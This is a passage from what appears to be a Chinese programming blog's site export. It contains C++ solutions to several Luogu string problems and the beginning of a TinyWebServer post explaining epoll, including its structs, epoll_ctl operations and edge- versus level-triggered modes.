class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">Reverse_String</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line"><span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line">s.<span class="built_in">erase</span>(<span class="number">0</span>, s.<span class="built_in">find_first_not_of</span>(<span class="string">&#x27;0&#x27;</span>)); <span class="comment">// 移除前导&#x27;0&#x27;</span></span><br><span class="line"><span class="keyword">return</span> s.<span class="built_in">empty</span>() ? <span class="string">&quot;0&quot;</span> : s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">Tail</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">s.<span class="built_in">erase</span>(s.<span class="built_in">find_last_not_of</span>(<span class="string">&#x27;0&#x27;</span>) + <span class="number">1</span>); <span class="comment">// 移除尾随&#x27;0&#x27;</span></span><br><span class="line"><span class="keyword">return</span> s.<span class="built_in">empty</span>() ? <span class="string">&quot;0&quot;</span> : s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string s ,res;</span><br><span class="line">cin &gt;&gt; s;</span><br><span class="line"><span class="type">int</span> pos;</span><br><span class="line"><span class="keyword">if</span> ((pos = s.<span class="built_in">find</span>(<span class="string">&#x27;.&#x27;</span>)) != string::npos)</span><br><span class="line">&#123;</span><br><span class="line">res = <span class="built_in">Reverse_String</span>(s.<span class="built_in">substr</span>(<span class="number">0</span>, pos));</span><br><span class="line">res += <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">res += <span class="built_in">Tail</span>(<span class="built_in">Reverse_String</span>(s.<span class="built_in">substr</span>(pos + <span class="number">1</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((pos = s.<span class="built_in">find</span>(<span class="string">&#x27;%&#x27;</span>)) != string::npos)</span><br><span class="line">&#123;</span><br><span class="line">res = <span class="built_in">Reverse_String</span>(s.<span class="built_in">substr</span>(<span class="number">0</span>, s.<span class="built_in">length</span>() - <span class="number">1</span>));</span><br><span class="line">res += <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((pos = s.<span class="built_in">find</span>(<span class="string">&#x27;/&#x27;</span>)) != string::npos)</span><br><span class="line">&#123;</span><br><span class="line">res = <span class="built_in">Reverse_String</span>(s.<span class="built_in">substr</span>(<span class="number">0</span>, pos));</span><br><span class="line">res += <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">res += <span class="built_in">Reverse_String</span>(s.<span class="built_in">substr</span>(pos + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">res = <span class="built_in">Reverse_String</span>(s);</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1603-斯诺登的密码"><a href="#P1603-斯诺登的密码" class="headerlink" title="P1603 斯诺登的密码"></a>P1603 斯诺登的密码</h3><p>我们用unordered_map来表示对应关系，注意当只有一位数且该数不为首位时，我们在前面添加0。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240517115038119.png" alt="image-20240517115038119"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">unordered_map&lt;string, <span class="type">int</span>&gt; map = &#123;</span><br><span class="line">    &#123;<span class="string">&quot;one&quot;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&quot;two&quot;</span>, <span class="number">2</span>&#125;, &#123;<span class="string">&quot;three&quot;</span>, <span class="number">3</span>&#125;, &#123;<span class="string">&quot;four&quot;</span>, <span class="number">4</span>&#125;, &#123;<span class="string">&quot;five&quot;</span>, <span class="number">5</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;six&quot;</span>, <span class="number">6</span>&#125;, &#123;<span class="string">&quot;seven&quot;</span>, <span class="number">7</span>&#125;, &#123;<span class="string">&quot;eight&quot;</span>, <span class="number">8</span>&#125;, &#123;<span class="string">&quot;nine&quot;</span>, <span class="number">9</span>&#125;, &#123;<span class="string">&quot;ten&quot;</span>, <span class="number">10</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;eleven&quot;</span>, <span class="number">11</span>&#125;, &#123;<span class="string">&quot;twelve&quot;</span>, <span class="number">12</span>&#125;, &#123;<span class="string">&quot;thirteen&quot;</span>, <span class="number">13</span>&#125;, &#123;<span class="string">&quot;fourteen&quot;</span>, <span class="number">14</span>&#125;, &#123;<span class="string">&quot;fifteen&quot;</span>, <span class="number">15</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;sixteen&quot;</span>, <span class="number">16</span>&#125;, &#123;<span class="string">&quot;seventeen&quot;</span>, <span class="number">17</span>&#125;, &#123;<span class="string">&quot;eighteen&quot;</span>, <span class="number">18</span>&#125;, &#123;<span class="string">&quot;nineteen&quot;</span>, <span class="number">19</span>&#125;, &#123;<span class="string">&quot;twenty&quot;</span>, <span class="number">20</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;a&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;both&quot;</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;another&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;first&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;second&quot;</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;third&quot;</span>, <span class="number">3</span>&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    string str;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        cin &gt;&gt; str;</span><br><span class="line">        <span class="keyword">if</span> (map.<span class="built_in">find</span>(str) != map.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> num = map[str];</span><br><span class="line">            num = (num * num) % <span class="number">100</span>;</span><br><span class="line">            res.<span class="built_in">push_back</span>(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="number">0</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; res[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; res.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (res[i] &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="number">0</span> &lt;&lt; res[i];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            cout &lt;&lt; res[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1200-USACO1-1-你的飞碟在这儿-Your-Ride-Is-Here"><a href="#P1200-USACO1-1-你的飞碟在这儿-Your-Ride-Is-Here" class="headerlink" title="P1200 [USACO1.1] 你的飞碟在这儿 Your Ride Is Here"></a>P1200 [USACO1.1] 你的飞碟在这儿 Your Ride Is Here</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240517120603409.png" alt="image-20240517120603409"></p><p>这里的话，要注意下转换时<code>(a[i] - &#39;A&#39; + 1)</code>要加1，否则答案不对。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string a, b;</span><br><span class="line">cin &gt;&gt; a;</span><br><span class="line">cin &gt;&gt; b;</span><br><span class="line"><span class="type">int</span> a_num = <span class="number">1</span>, b_num = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; a.<span class="built_in">length</span>(); i++)</span><br><span class="line">&#123;</span><br><span class="line">a_num *= <span class="built_in">int</span>(a[i] - <span class="string">&#x27;A&#x27;</span> + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">a_num = a_num % <span class="number">47</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; b.<span class="built_in">length</span>(); i++)</span><br><span class="line">&#123;</span><br><span class="line">b_num *= <span class="built_in">int</span>(b[i] - <span class="string">&#x27;A&#x27;</span> + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">b_num = b_num % <span class="number">47</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (b_num == a_num)</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;GO&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;STAY&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1597-语句解析"><a href="#P1597-语句解析" class="headerlink" title="P1597 语句解析"></a>P1597 语句解析</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240517125243119.png" alt="image-20240517125243119"></p><p>这题给我cpu干烧了，脑子没反应过来，把a赋值给b不是让b的值为a。那么这题则可以使用map来解决。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   </span><br><span class="line">    unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; var = &#123; &#123;<span class="string">&#x27;a&#x27;</span>, <span class="number">0</span>&#125;, &#123;<span class="string">&#x27;b&#x27;</span>, <span class="number">0</span>&#125;, &#123;<span class="string">&#x27;c&#x27;</span>, <span class="number">0</span>&#125; &#125;;</span><br><span class="line">    string input;</span><br><span class="line">    <span class="built_in">getline</span>(cin, input);</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (pos &lt; input.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="type">char</span> var1 = input[pos];       </span><br><span class="line">        pos += <span class="number">3</span>;                      </span><br><span class="line">        <span class="type">char</span> var2 = input[pos];        </span><br><span class="line">        pos += <span class="number">2</span>;                     </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isdigit</span>(var2)) &#123;</span><br><span class="line">            var[var1] = var2 - <span class="string">&#x27;0&#x27;</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            var[var1] = var[var2];  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; var[<span class="string">&#x27;a&#x27;</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; var[<span class="string">&#x27;b&#x27;</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; var[<span class="string">&#x27;c&#x27;</span>] &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="P1598-垂直柱状图"><a href="#P1598-垂直柱状图" class="headerlink" title="P1598 垂直柱状图"></a>P1598 垂直柱状图</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240517131831636.png" alt="image-20240517131831636"></p><p>这题还是比较简单的，要注意下判断该字符是否为字符(原文有空格和句号)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> countnum[<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string s;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">getline</span>(cin, s);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="type">char</span>&amp; ch : s)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isalpha</span>(ch))</span><br><span class="line">countnum[ch -<span class="string">&#x27;A&#x27;</span>] ++ ;<span class="comment">//原本想命名为count，发现count时std命名空间了的。。。</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> maxnum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (countnum[i] &gt; maxnum)</span><br><span class="line">maxnum = countnum[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (maxnum)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (countnum[i] == maxnum)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">countnum[i]--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;  &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(<span class="string">&#x27;A&#x27;</span> + i) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>洛谷字符串完结撒花！！！</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TinyWebServer epoll&amp;&amp;webserver</title>
      <link href="/2024/05/08/TinyWebServer/0x7epoll%E5%92%8Cwebserver/"/>
      <url>/2024/05/08/TinyWebServer/0x7epoll%E5%92%8Cwebserver/</url>
      
        <content type="html"><![CDATA[<h1 id="epoll-amp-amp-webserver"><a href="#epoll-amp-amp-webserver" class="headerlink" title="epoll&amp;&amp;webserver"></a>epoll&amp;&amp;webserver</h1><h3 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h3><h4 id="I-O多路复用"><a href="#I-O多路复用" class="headerlink" title="I/O多路复用"></a>I/O多路复用</h4><p>I/O多路复用（I/O Multiplexing）是一种允许单个线程或进程同时监视多个文件描述符（通常是网络套接字）的可读、可写和异常等事件的技术。</p><p><a href="https://zhuanlan.zhihu.com/p/367591714">IO多路复用——深入浅出理解select、poll、epoll的实现 - 知乎 (zhihu.com)</a></p><p>当然，我们在这里使用的是最现代，最高效的<code>epoll</code>系统调用。</p><p>在Linux系统中，当需要处理多个文件描述符时，<code>epoll</code>可以用来监控这些文件描述符的读写事件。当至少一个文件描述符准备好进行I/O操作时，<code>epoll</code>会通知应用程序，从而允许程序执行非阻塞的I/O操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * epoll_data_t 是一个联合体，用于存储 epoll_event 结构体中的用户数据。</span></span><br><span class="line"><span class="comment"> * 它可以存储指针 ptr、文件描述符 fd、32位整数 u32 或 64位整数 u64。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span> <span class="title class_">epoll_data</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr;          <span class="comment">/* 指针类型 */</span></span><br><span class="line">    <span class="type">int</span> fd;             <span class="comment">/* 文件描述符 */</span></span><br><span class="line">    <span class="type">uint32_t</span> u32;       <span class="comment">/* 32位无符号整数 */</span></span><br><span class="line">    <span class="type">uint64_t</span> u64;       <span class="comment">/* 64位无符号整数 */</span></span><br><span class="line">&#125; <span class="type">epoll_data_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * epoll_event 结构体定义了一个 epoll 事件。</span></span><br><span class="line"><span class="comment"> * 它包含了事件 events 和用户数据 data。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">epoll_event</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> events;    <span class="comment">/* Epoll events，用于指定感兴趣的事件类型 */</span></span><br><span class="line">    <span class="type">epoll_data_t</span> data;  <span class="comment">/* User data variable，用于存储用户数据 */</span></span><br><span class="line">&#125; __EPOLL_PACKED;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>epoll</code> 相关的主要函数有：</p><ol><li><code>epoll_create()</code> 或 <code>epoll_create1()</code>：创建一个 <code>epoll</code> 实例并返回一个文件描述符，用于后续的 <code>epoll</code> 操作。</li><li><code>epoll_ctl()</code>：用于向 <code>epoll</code> 实例添加、修改或删除要监控的文件描述符及其事件。</li><li><code>epoll_wait()</code> 或 <code>epoll_pwait()</code>：等待 <code>epoll</code> 实例中指定的文件描述符上的一个或多个事件发生，返回发生事件的文件描述符及其事件类型。</li></ol><p>epoll_ctl()的操作类型：</p><div class="table-container"><table><thead><tr><th>操作类型</th><th>描述</th></tr></thead><tbody><tr><td>EPOLL_CTL_ADD</td><td>添加一个文件描述符到 epoll 实例中，并且关联一个事件掩码（event mask），用于监听特定的事件。</td></tr><tr><td>EPOLL_CTL_MOD</td><td>修改已经添加到 epoll 实例中的文件描述符的事件掩码。这可以用于改变监听的事件类型或更新兴趣列表。</td></tr><tr><td>EPOLL_CTL_DEL</td><td>从 epoll 实例中删除一个文件描述符，不再监听该文件描述符上的事件。</td></tr></tbody></table></div><p><code>epoll</code> 支持两种工作模式：</p><ol><li><strong>水平触发（Level Triggered, LT）</strong>：当文件描述符就绪时，<code>epoll_wait()</code> 会通知处理程序。如果处理程序没有完全处理该文件描述符上的所有数据，下次调用 <code>epoll_wait()</code> 时，它还会再次通知同一个文件描述符。</li><li><strong>边缘触发（Edge Triggered, ET）</strong>：当文件描述符的状态发生变化时，<code>epoll_wait()</code> 会通知处理程序。处理程序必须处理完所有就绪的 I/O 操作，因为如果再次调用 <code>epoll_wait()</code>，它可能不会因为同一个文件描述符而再次被唤醒，除非又有新的 I/O 事件发生。</li></ol><p><strong><code>注意ET模式的文件描述符应该是非阻塞的</code></strong>,这是因为<a href="https://blog.csdn.net/qq_52572621/article/details/127792861">【Linux Socket C++】为什么IO复用需要用到非阻塞IO？EAGAIN的简单介绍与应用_c++ eagain-CSDN博客</a>。</p><p>我们这里使用效率更高的<code>ET</code>模式。</p><h4 id="epoller-h"><a href="#epoller-h" class="headerlink" title="epoller.h"></a>epoller.h</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> EPOLLER_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EPOLLER_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span>  <span class="comment">//无符号整数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span>  <span class="comment">//epoll</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>      <span class="comment">//一系列与文件描述符相关的函数，如 fcntl、open、close 等。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>     <span class="comment">//read、write、close、dup2 